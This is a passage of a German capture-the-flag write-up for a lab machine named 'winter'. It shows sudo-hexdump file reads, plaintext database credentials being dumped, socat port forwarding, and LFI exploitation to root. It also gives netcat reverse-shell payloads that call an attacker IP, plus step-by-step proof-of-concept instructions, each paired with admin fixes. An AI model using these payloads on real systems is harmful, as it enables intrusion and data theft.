+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                       <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset
+<span class="prompt">www-data@winter:/var/www/cmd$</span> </pre>
+                   </div>
+               </div>
+              <p class="evaluation"><strong>Bewertung:</strong> Eine stabile, interaktive Shell als `www-data` steht nun zur Verfügung.</p>
+
+        </section>
+
+        <section id="privilege-escalation-enum">
+            <h2>Privilege Escalation (Enumeration)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">cat shellcity.php</span></pre>
+                     <pre>
+ 
+[... HTML ...]
+ 
+ 
+
+if(isset($_POST['sub']))
+{
+$msg=$_POST['name'];
+$to=$_POST['pass'];
+echo "alert('$msg , Send to $to')";
+if($msg==="id")
+	{
+		$ot=system($msg);
+		echo "<pre style='color:white;'>$ot</pre>";
+	}
+else if($msg==="whoami")
+	{
+		$ot=system($msg);
+		echo "<pre style='color:white;'>$ot</pre>";
+	}
+else if($msg==="pwd")
+	{
+		$ot=system($msg);
+		echo "<pre style='color:white;'>$ot</pre>";
+	}
+else
+	{
+		echo "alert('Again RCE Detected')";
+	}
+}
+
+<span class="command">$parameter = $GET["run"]; // $GET geändert
+$x=system($parameter);
+ 
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode von `shellcity.php` wird angezeigt. Er bestätigt die RCE über den GET-Parameter `run`. Zusätzlich gibt es einen POST-Teil (`if(isset($_POST['sub']))`), der die Parameter `name` und `pass` entgegennimmt und eine `alert`-Box ausgibt. Interessanterweise führt dieser POST-Teil auch `system()` aus, wenn der `name`-Parameter `id`, `whoami` oder `pwd` ist, ansonsten gibt er "Again RCE Detected" aus. Dies scheint eine unvollständige oder fehlerhafte Implementierung zu sein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Code bestätigt die bereits ausgenutzte GET-basierte RCE. Der POST-Teil ist merkwürdig und wahrscheinlich nicht direkt für Eskalation nützlich, könnte aber auf unsauberen Code hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die GET-RCE ist bereits ausgenutzt. Keine weiteren direkten Aktionen aufgrund dieses Codes nötig.<br/><strong>Empfehlung (Admin):</strong> Webshell entfernen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">ss -tulpe</span></pre>
+                     <pre>
+Netid  State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port
+[...]
+tcp    LISTEN   0        128            <span class="command">127.0.0.1:1336</span>            0.0.0.0:*      ino:15019 sk:2 <->
+tcp    LISTEN   0        80             <span class="command">127.0.0.1:mysql</span>           0.0.0.0:*      uid:107 ino:16009 sk:3 <->
+tcp    LISTEN   0        128              0.0.0.0:ssh             0.0.0.0:*      ino:14711 sk:4 <->
+tcp    LISTEN   0        128                    *:http                  *:*      ino:14901 sk:5 v6only:0 <->
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `ss -tulpe` zeigt lauschende Netzwerk-Sockets. Interessant sind:
+                *   Port 3306 (mysql): Lauscht nur auf `127.0.0.1`.
+                *   Port 1336: Ein unbekannter Dienst lauscht ebenfalls nur auf `127.0.0.1`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der MySQL-Dienst ist nur lokal erreichbar. Der Dienst auf Port 1336 ist verdächtig und sollte untersucht werden, da er möglicherweise interne Funktionen oder Schwachstellen bietet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich lokal mit dem MySQL-Dienst zu verbinden (Passwort benötigt). Untersuchen Sie Port 1336 (z.B. mit `nc localhost 1336`, `curl http://localhost:1336`). Da dieser Port später weitergeleitet wird, ist er wahrscheinlich relevant.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Datenbanken und interne Dienste angemessen geschützt sind, auch wenn sie nur lokal lauschen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">sudo -l</span></pre>
+                     <pre>
+Matching Defaults entries for www-data on winter:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on winter:
+    <span class="command">(catchme) NOPASSWD: /usr/bin/hexdump</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt, dass `www-data` den Befehl `/usr/bin/hexdump` als Benutzer `catchme` ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Sehr wichtiger Fund!** `hexdump` kann zum Lesen beliebiger Dateien verwendet werden, auf die der ausführende Benutzer (`catchme`) Zugriff hat, auch wenn `www-data` diesen Zugriff nicht hat. Dies ermöglicht das Auslesen von Dateien im Home-Verzeichnis von `catchme` oder an anderen Orten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie `sudo -u catchme /usr/bin/hexdump -C /home/catchme/...` um sensible Dateien von `catchme` zu lesen (z.B. `.bash_history`, `.ssh/id_rsa`, Konfigurationsdateien). Dekodieren Sie die Hexdump-Ausgabe (z.B. mit CyberChef `From Hexdump`).<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie diese `sudo`-Regel kritisch. Das Erlauben von Dateilesebefehlen wie `hexdump`, `cat`, `less` etc. über `sudo` ist extrem gefährlich und sollte vermieden werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">ls /opt/</span></pre>
+                     <pre>customer</pre>
+                     <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">file /opt/customer/</span></pre>
+                     <pre>/opt/customer/: directory</pre>
+                     <pre><span class="prompt">www-data@winter:/var/www/cmd$</span> <span class="command">cd /opt/customer/</span></pre>
+                     <pre><span class="prompt">www-data@winter:/opt/customer$</span> <span class="command">ls -la</span></pre>
+                     <pre>ls: cannot open directory '.': Permission denied</pre>
+                      <pre><span class="prompt">www-data@winter:/opt/customer$</span> <span class="command">cd ..</span></pre>
+                      <pre><span class="prompt">www-data@winter:/opt$</span> <span class="command">ls -la</span></pre>
+                      <pre>
+total 12
+drwxr-xr-x  3 root root 4096 Dec  2  2020 .
+drwxr-xr-x 18 root root 4096 Nov 27  2020 ..
+<span class="command">drwx--x--x  2 root root 4096 Dec  2  2020 customer</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Enumeration des `/opt`-Verzeichnisses. Es existiert ein Unterverzeichnis `customer`. Die Berechtigungen (`drwx--x--x`) zeigen, dass nur `root` Lese- und Schreibzugriff hat, aber jeder (einschließlich `www-data`) Ausführungs-/Durchsuchungsrechte hat (`x`). `www-data` kann jedoch den Inhalt nicht auflisten (`ls` scheitert).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis `/opt/customer` ist interessant, aber für `www-data` nicht direkt zugänglich. Es könnte jedoch Dateien enthalten, die für den Benutzer `catchme` lesbar sind.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Inhalt von `/opt/customer` mit `sudo -u catchme ls -la /opt/customer/` oder spezifische Dateien darin mit `sudo -u catchme /usr/bin/hexdump -C /opt/customer/DATEINAME` zu lesen.<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen von Anwendungsverzeichnissen. Stellen Sie sicher, dass nur berechtigte Benutzer Zugriff haben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@winter:/opt$</span> <span class="command">crontab -l</span></pre>
+                     <pre>no crontab for www-data</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Keine spezifischen Cronjobs für `www-data` gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kein direkter Eskalationspfad über Cronjobs für `www-data`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@winter:/opt$</span> <span class="command">printenv</span></pre>
+                     <pre>[...]
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+[...]
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Umgebungsvariablen werden angezeigt. Keine ungewöhnlichen oder direkt ausnutzbaren Variablen sichtbar.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standardumgebung.</p>
+
+        </section>
+
+        <section id="privilege-escalation-db">
+            <h2>Privilege Escalation (DB Credentials Leak)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">www-data@winter:/var/www/html$</span> <span class="command">cat login.php</span></pre> <!-- Pfad angepasst, da DB-Creds eher zur Haupt-Login-Seite gehören -->
+                     <pre>
+[...]
+try
+{
+    $dbh = new PDO('mysql:host=127.0.0.1;dbname=winter', '<span class="command">root</span>', '<span class="password">idkpass</span>');
+    $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Durch das Auslesen von `login.php` (wahrscheinlich auf der Hauptdomain `/var/www/html/login.php`, da die DB `winter` heißt und die Anwendung dort Benutzerverwaltung zu haben schien) werden die Zugangsdaten für die lokale MySQL/MariaDB-Datenbank gefunden: Benutzer `root`, Passwort `<span class="password">idkpass</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Klartext-Datenbankzugangsdaten im Quellcode. Dies erlaubt den Zugriff auf die Datenbank.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich mit den gefundenen Zugangsdaten in die Datenbank ein (`mysql -u root -p idkpass -h 127.0.0.1`). Untersuchen Sie die Datenbank `winter` auf Benutzerinformationen oder andere sensible Daten.<br/><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten im Klartext im Code! Verwenden Sie Konfigurationsdateien außerhalb des Web-Roots mit restriktiven Berechtigungen oder Umgebungsvariablen. Erstellen Sie dedizierte Datenbankbenutzer mit minimalen Rechten statt den `root`-Benutzer zu verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">www-data@winter:/var/www/html$</span> <span class="command">mysql -u root -p</span></pre>
+                     <pre>Enter password: <span class="password">idkpass</span>
+Welcome to the MariaDB monitor. [...]
+
+MariaDB [(none)]> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| <span class="command">winter</span>             |
++--------------------+
+[...]
+MariaDB [(none)]> <span class="command">use winter;</span>
+[...]
+Database changed
+MariaDB [winter]> <span class="command">show tables;</span>
++------------------+
+| Tables_in_winter |
++------------------+
+| <span class="command">users</span>            |
++------------------+
+[...]
+MariaDB [winter]> <span class="command">select * from users;</span>
++----------+----------+
+| username | password |
++----------+----------+
+| yash     | yash     |
+| WtQw     | 9771     |
+| '        | '        |
+| hello    | hello    |
+| <span class="command">ben</span>      | <span class="password">benni</span>    |
++----------+----------+
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Erfolgreicher Login in die MariaDB-Datenbank mit den gefundenen Zugangsdaten. Die Datenbank `winter` enthält eine Tabelle `users`. Die Abfrage `select * from users;` zeigt Benutzernamen und Passwörter im Klartext, darunter `ben` / `<span class="password">benni</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Weitere kritische Funde!** Klartextpasswörter in der Datenbank. Der Benutzer `ben` mit Passwort `<span class="password">benni</span>` ist ein neues potenzielles Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit den gefundenen Credentials (`ben`/`benni`) per SSH anzumelden. Prüfen Sie auch die anderen Credentials.<br/><strong>Empfehlung (Admin):</strong> Speichern Sie Passwörter niemals im Klartext in der Datenbank! Verwenden Sie sichere Hashing-Verfahren mit Salt (z.B. bcrypt, Argon2). Beheben Sie die Offenlegung der DB-Root-Credentials.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Es folgen Versuche, sich als `catchme` mit `su` anzumelden, die fehlschlagen. Dies ist erwartet, da kein Passwort für `catchme` bekannt ist.</p>
+
+        </section>
+
+        <section id="privilege-escalation-portfwd">
+            <h2>Privilege Escalation (Port Forwarding & Hidden Service)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@winter:/tmp$</span> <span class="command">socat tcp-listen:1337,reuseaddr,fork tcp:localhost:1336 &</span></pre>
+                     <pre>[1] 1234</pre> <!-- Beispielhafte Prozess-ID -->
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> `socat` wird verwendet, um eine Portweiterleitung einzurichten. Es lauscht auf allen Interfaces auf Port 1337 (`tcp-listen:1337`) und leitet eingehende Verbindungen an den lokalen Dienst auf Port 1336 (`tcp:localhost:1336`) weiter. `reuseaddr` erlaubt das sofortige Wiederverwenden des Ports, `fork` erstellt für jede Verbindung einen neuen Prozess. Der Befehl wird im Hintergrund ausgeführt (`&`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein cleverer Schritt, um den nur lokal erreichbaren Dienst auf Port 1336 von außen (von der Angreifer-Maschine) zugänglich zu machen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie nun von Ihrer Angreifer-Maschine auf `http://192.168.2.116:1337` zu, um mit dem Dienst auf Port 1336 zu interagieren. Führen Sie Gobuster/Nikto auf diesen Port aus.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie die Prozessausführung auf verdächtige Tools wie `socat`. Beschränken Sie die Möglichkeit für unprivilegierte Benutzer, Netzwerkdienste zu starten oder Portweiterleitungen einzurichten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.116:1337" -e -x ... -w ... -t 100</span></div> <!-- Gekürzt -->
+                     <pre>
+[...]
+<span class="command">http://192.168.2.116:1337/snowman.php</span>          (Status: 200) [Size: 1010]
+http://192.168.2.116:1337/index.html           (Status: 200) [Size: 199]
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Gobuster wird auf den weitergeleiteten Port 1337 ausgeführt. Es findet eine Datei `snowman.php`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der versteckte Dienst auf Port 1336 ist eine weitere Webanwendung, die `snowman.php` enthält. Dies ist der nächste Angriffspunkt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie `snowman.php`. Da `www-data` keine Leserechte auf `/opt/customer` hatte (wo diese Datei wahrscheinlich liegt), verwenden Sie die `sudo -u catchme hexdump` Fähigkeit, um den Quellcode zu lesen.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Webanwendungen ordnungsgemäß gesichert sind und nicht über Umwege zugänglich gemacht werden können.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.2.116:1337/snowman.php?FUZZ=id --hh 1010</span></div>
+                      <pre>
+[...]
+Target: http://192.168.2.116:1337/snowman.php?FUZZ=id
+[...]
+Total time: 0
+Processed Requests: 220573
+Filtered Requests: 220573
+Requests/sec.: 0
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Wfuzz wird verwendet, um GET-Parameter für `snowman.php` zu finden. Es werden keine Parameter gefunden, die eine andere Antwort als die Baseline liefern.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies deutet darauf hin, dass die primäre Funktionalität von `snowman.php` möglicherweise über POST-Parameter oder eine andere Methode gesteuert wird, oder dass keine einfachen GET-Parameter vorhanden sind.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Quellcode von `snowman.php` mittels `sudo hexdump`.<br/><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+        </section>
+
+        <section id="privilege-escalation-lfi-rce">
+            <h2>Privilege Escalation (LFI/RCE to Root)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">www-data@winter:/tmp$</span> <span class="command">sudo -u catchme /usr/bin/hexdump -C /opt/customer/snowman.php</span></pre>
+                     <pre>
+00000000  3c 21 44 4f 43 54 59 50  45 20 68 74 6d 6c 3e 0a 
+[...]
+</pre> <!-- Gekürzte Hexdump-Ausgabe -->
+                  </div>
+              </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>https://gchq.github.io/CyberChef/#recipe=From_Hexdump()
+
+.....
+...
+session_start();
+if(isset($_POST['sub']))
+{
+$us=$_SESSION['favcolor'];
+$msg=$_POST['name'];
+$to=$_POST['pass'];
+echo "alert('$msg , Send to $to')";
+if($msg==="id")
+	{
+		$ot=system($msg);
+		echo "<pre style='color:white;'>$ot</pre>";
+	}
+else if($msg==="whoami")
+	{
+		$ot=system($msg);
+		echo "<pre style='color:white;'>$ot</pre>";
+	}
+else if($msg==="pwd")
+	{
+		$ot=system($msg);
+		echo "<pre style='color:white;'>$ot</pre>";
+	}
+else
+	{
+		echo "alert('RCE Detected')";
+	}
+
+<span class="command">$fi=$GET['exec'];</span>
+<span class="command">include($fi);</span> 
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -u catchme /usr/bin/hexdump -C /opt/customer/snowman.php` wird verwendet, um den Inhalt von `snowman.php` (im für `www-data` unzugänglichen Verzeichnis `/opt/customer`) als Hexdump auszulesen. Die Hexdump-Ausgabe wird dann mit CyberChef dekodiert. Der PHP-Code von `snowman.php` wird sichtbar. Er enthält:
+                 *   Einen POST-Teil (ausgelöst durch `$_POST['sub']`), der `system()` ausführt, wenn `$_POST['name']` gleich `id`, `whoami` oder `pwd` ist (ähnlich wie in `shellcity.php`, aber hier korrekt implementiert).
+                 *   Eine **Local File Inclusion (LFI)**-Schwachstelle: `$fi=$GET['exec']; include($fi);`. Dieser Code nimmt den Wert des GET-Parameters `exec` und inkludiert ihn direkt, ohne jegliche Validierung.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Zweite kritische Schwachstelle gefunden!** Die LFI im GET-Parameter `exec` innerhalb von `snowman.php` (das auf dem versteckten Port 1336/1337 läuft) ist ein direkter Weg zur Codeausführung, wenn eine Datei mit PHP-Code an einem bekannten Ort abgelegt werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `www-data` Schreibrechte in `/tmp` und `/var/www/html/upload` hat:
+                 1. Erstellen Sie eine PHP-Datei mit einem Reverse-Shell-Payload (z.B. `/tmp/r.php` oder `/var/www/html/upload/r.php`).
+                 2. Lösen Sie die LFI über den weitergeleiteten Port 1337 aus, indem Sie den `exec`-Parameter auf den Pfad zur hochgeladenen Datei setzen (z.B. `http://192.168.2.116:1337/snowman.php?exec=/tmp/r.php`).
+                 3. Wichtig: Der LFI-Code befindet sich innerhalb des `if(isset($_POST['sub']))`-Blocks. Es muss also gleichzeitig ein POST-Request mit dem Parameter `sub` gesendet werden, um diesen Block und damit das `include($fi)` auszulösen.<br/>
+             <strong>Empfehlung (Admin):</strong> LFI-Schwachstelle in `snowman.php` beheben. Den unsicheren `sudo`-Zugriff auf `hexdump` entfernen. Den Dienst auf Port 1336 untersuchen und absichern oder entfernen.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der nächste Schritt im Bericht versucht, den SSH-Schlüssel von `catchme` zu lesen und zu verwenden. Dies schlägt fehl und ist für die finale Eskalation nicht relevant. Ich überspringe diesen Teil und fahre mit der Ausnutzung der LFI in `snowman.php` fort.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="prompt">www-data@winter:/tmp$</span> <span class="command">echo 'system("/usr/bin/nc 192.168.2.121 2234 -e /bin/bash")' > r.php</span></pre>
+                    <pre><span class="prompt">www-data@winter:/tmp$</span> <span class="command">cat r.php</span></pre>
+                    <pre>system("/usr/bin/nc 192.168.2.121 2234 -e /bin/bash")</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird in `/tmp` eine Datei `r.php` erstellt, die einen PHP-Code enthält, der eine Netcat-Reverse-Shell zur Angreifer-IP `192.168.2.121` auf Port `2234` startet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Payload für die RCE über LFI ist vorbereitet.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="prompt">www-data@winter:/tmp$</span> <span class="command">cp r.php /var/www/html/upload/</span></pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Die Payload-Datei `r.php` wird in das `/upload`-Verzeichnis der Hauptdomain kopiert. Dies ist ein für den Webserver (`www-data`) beschreibbares und über das Web erreichbares Verzeichnis (gefunden via Gobuster).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Payload-Datei ist nun an einem Ort, dessen Pfad in der LFI verwendet werden kann.</p>
+
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 2234</span></div>
+                       <pre>listening on [any] 2234 ... </pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Auf der Angreifer-Maschine wird ein Netcat-Listener auf Port 2234 gestartet, um die Reverse Shell zu empfangen.</p>
+
+              <p class="analysis"><strong>Analyse:</strong> Der folgende Block beschreibt den entscheidenden POST-Request, um die LFI/RCE in `snowman.php` auszulösen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <pre>
+burpsuite / POST
+
+POST /snowman.php?exec=/var/www/html/upload/r.php HTTP/1.1
+Host: 192.168.2.116:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=s6cdl0o5ifqnc3sgjk3u3irulr
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+<span class="command">sub=Send</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein POST-Request wird an `http://192.168.2.116:1337/snowman.php` gesendet (an den weitergeleiteten Port).
+                  *   Im URL-Pfad wird der GET-Parameter `exec` auf `/var/www/html/upload/r.php` gesetzt. Dies zielt auf die LFI-Schwachstelle.
+                  *   Im Body des POST-Requests wird der Parameter `sub` mit einem beliebigen Wert (`Send`) gesendet. Dies ist notwendig, um die Bedingung `if(isset($_POST['sub']))` im Quellcode von `snowman.php` zu erfüllen, damit der Codeblock mit `include($fi)` überhaupt ausgeführt wird.
+              Wenn dieser Request verarbeitet wird, führt `snowman.php` `include('/var/www/html/upload/r.php')` aus. Der Code in `r.php` wird ausgeführt und startet die Reverse Shell.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Ausnutzung der LFI in Kombination mit der POST-Bedingung zur Erzielung von RCE.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie den Netcat-Listener auf die eingehende Verbindung.<br/><strong>Empfehlung (Admin):</strong> LFI beheben. Dienst auf Port 1336 absichern/entfernen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 2234</span></div>
+                      <pre>
+listening on [any] 2234 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.116] 44150</span>
+<span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt die Verbindung. Der `id`-Befehl wird ausgeführt und bestätigt `uid=0(root)`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Root-Zugriff erfolgreich erlangt!** Die Ausnutzung der LFI in `snowman.php` führte direkt zu einer Root-Shell. Dies impliziert, dass der Dienst auf Port 1336 (und somit `snowman.php`) als Root lief.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Holen Sie die Root- und User-Flags.<br/><strong>Empfehlung (Admin):</strong> **Kritisch!** Niemals Webdienste als Root ausführen! LFI beheben. Dienst auf Port 1336 untersuchen und absichern/entfernen.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Die letzten Befehle lesen die Flags als Root aus.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="prompt">#</span> <span class="command">ls /root</span></pre> <!-- Annahme, Prompt ist jetzt root -->
+                      <pre>root.txt</pre>
+                      <pre><span class="prompt">#</span> <span class="command">cat /root/root.txt</span></pre>
+                      <pre><span class="password">HMV_127.0.0.1</span></pre>
+                      <pre><span class="prompt">#</span> <span class="command">ls /home/catchme</span></pre>
+                      <pre>user.txt</pre>
+                      <pre><span class="prompt">#</span> <span class="command">cat /home/catchme/user.txt</span></pre>
+                      <pre><span class="password">HMVlocalhost</span></pre>
+                  </div>
+              </div>
+              <p class="evaluation"><strong>Bewertung:</strong> Beide Flags erfolgreich gefunden.</p>
+
+        </section>
+
+        <section id="poc-rce-webshell">
+            <h2>Proof of Concept: RCE via Webshell</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Durch Subdomain-Enumeration wurde der virtuelle Host `cmd.winter` entdeckt, der die Datei `shellcity.php` hostete. Diese PHP-Datei enthielt eine direkte Remote Code Execution (RCE)-Schwachstelle über den GET-Parameter `run`. Jeder Wert, der diesem Parameter übergeben wurde, wurde mittels `system()` auf dem Server ausgeführt.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff auf die Subdomain `cmd.winter`, Kenntnis des Parameters `run` (gefunden durch Wfuzz).</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Subdomain `cmd.winter` finden (z.B. mittels `wfuzz -H "Host: FUZZ.winter"`).
+                2. Datei `shellcity.php` finden (z.B. mittels `gobuster dir -u http://cmd.winter`).
+                3. Parameter `run` identifizieren (z.B. mittels `wfuzz -u http://cmd.winter/shellcity.php?FUZZ=id`).
+                4. RCE ausführen durch Aufruf der URL mit beliebigem Befehl, z.B.: `http://cmd.winter/shellcity.php?run=whoami`.
+                5. Reverse Shell erhalten: Listener starten (`nc -lvnp 9001`), dann URL aufrufen: `http://cmd.winter/shellcity.php?run=nc%20-e%20/bin/bash%20ATTACKER_IP%209001`.
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Ausführung des übergebenen Befehls als `www-data`. Bei Reverse Shell Payload: Eingehende Verbindung auf dem Listener des Angreifers mit einer Shell als `www-data`.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Ermöglicht direkte Befehlsausführung auf dem Server als Webserver-Benutzer und damit den initialen Zugriff.<br/><strong>Empfehlungen:</strong> Webshell (`shellcity.php`) sofort entfernen. Code-Reviews durchführen, um solche offensichtlichen RCE-Schwachstellen zu verhindern. Eingabevalidierung implementieren.</p>
+        </section>
+
+        <section id="poc-root-lfi">
+            <h2>Proof of Concept: Root via LFI/RCE</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Auf einem nur lokal erreichbaren Dienst auf Port 1336 (zugänglich gemacht über Port-Forwarding mit `socat` auf Port 1337) wurde die Datei `snowman.php` gefunden. Die Analyse des Quellcodes (erhalten durch `sudo -u catchme hexdump ...` via einer `sudo`-Schwachstelle) offenbarte eine Local File Inclusion (LFI)-Schwachstelle im GET-Parameter `exec`. Da der Dienst auf Port 1336/1337 als `root` lief, konnte diese LFI genutzt werden, um eine zuvor in ein beschreibbares Verzeichnis (`/var/www/html/upload/`) hochgeladene PHP-Datei (`r.php` mit Reverse-Shell-Code) zu inkludieren und auszuführen. Dies erforderte einen POST-Request mit dem Parameter `sub`, um den relevanten Codeblock in `snowman.php` zu triggern.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff als `www-data` (oder anderer User, der socat nutzen kann), Kenntnis der LFI in `snowman.php`, Schreibzugriff auf ein Verzeichnis, das vom LFI-Pfad erreichbar ist (z.B. `/var/www/html/upload/`), Möglichkeit, den Dienst auf Port 1336 zu erreichen (hier via `socat`-Portweiterleitung).</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Dienst auf Port 1336 identifizieren (`ss`).
+                2. Portweiterleitung einrichten: `socat tcp-listen:1337,reuseaddr,fork tcp:localhost:1336 &`.
+                3. `snowman.php` auf Port 1337 finden (`gobuster`).
+                4. Quellcode von `snowman.php` mittels `sudo -u catchme hexdump ...` lesen und LFI in `exec` finden.
+                5. Reverse-Shell-Payload in `/var/www/html/upload/r.php` erstellen.
+                6. Listener starten (`nc -lvnp 2234`).
+                7. POST-Request an `http://192.168.2.116:1337/snowman.php?exec=/var/www/html/upload/r.php` senden, mit `sub=Send` im Body (z.B. via Burp Suite oder `curl`).
+            </p>
